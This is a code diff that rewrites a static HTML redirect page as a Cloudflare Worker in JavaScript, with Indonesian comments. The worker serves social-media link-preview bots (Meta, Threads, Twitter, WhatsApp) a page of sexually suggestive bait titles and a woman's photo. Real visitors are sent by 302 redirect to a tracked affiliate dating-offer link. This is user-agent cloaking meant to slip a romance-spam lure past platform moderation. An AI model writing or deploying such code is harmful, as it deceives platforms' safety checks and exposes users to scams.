@@ -1,27 +1,38 @@
-<!DOCTYPE html>
+export default {
+  async fetch(request) {
+    const userAgent = request.headers.get("user-agent") || "";
+
+    // Deteksi bot Threads/Meta
+    const isBot = /facebookexternalhit|Twitterbot|ThreadsBot|WhatsApp/i.test(userAgent);
+
+    const htmlPreview = `<!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <title>Home alone, want to come over? 🥰</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  
-  <!-- OG Meta -->
-  <meta property="og:title" content="Home alone, want to come over? 🥰" />
-  <meta property="og:description" content="I'm alone at home... Let's chat 😘" />
-  <meta property="og:image" content="https://i.postimg.cc/hG3sZ74H/Snapinsta-app-340487404-752996419828397-4032469551223478880-n-1080.jpg" />
-  <meta property="og:url" content="https://yourusername.github.io/preview/" />
-  <meta name="robots" content="noindex" />
+  <meta charset="UTF-8">
+  <title>I just wanna be good for you</title>
+  <meta property="og:title" content="I just wanna be good for you" />
+  <meta property="og:description" content="Let's talk in private 💕" />
+  <meta property="og:image" content="https://i.postimg.cc/28VZTXL8/IMG-20220107-WA0012.jpg" />
+  <meta property="og:url" content="https://withered-paper-3dfa.keenam0991.workers.dev/" />
 </head>
 <body>
-  <p>
-    If you are not redirected automatically,
-    <a href="https://exvlq.yourfandate.net/?utm_source=da57dc555e50572d&ban=inst&j1=1&s1=22010&s2=1127873&s3=ZORO&click_id=Alteam">click here</a>.
-  </p>
   <script>
-    // Optional: Redirect after delay
     setTimeout(() => {
       window.location.href = "https://exvlq.yourfandate.net/?utm_source=da57dc555e50572d&ban=inst&j1=1&s1=22010&s2=1127873&s3=ZORO&click_id=Alteam";
-    }, 4000);
+    }, 3000); // Redirect setelah 3 detik
   </script>
+  <p>Redirecting... please wait</p>
 </body>
-</html>
+</html>`;
+
+    // Jika bot, kirim halaman untuk dibaca OG tags
+    if (isBot) {
+      return new Response(htmlPreview, {
+        headers: { 'content-type': 'text/html' },
+      });
+    }
+
+    // Jika bukan bot (user nyata), redirect langsung
+    return Response.redirect("https://exvlq.yourfandate.net/?utm_source=da57dc555e50572d&ban=inst&j1=1&s1=22010&s2=1127873&s3=ZORO&click_id=Alteam", 302);
+  }
+};
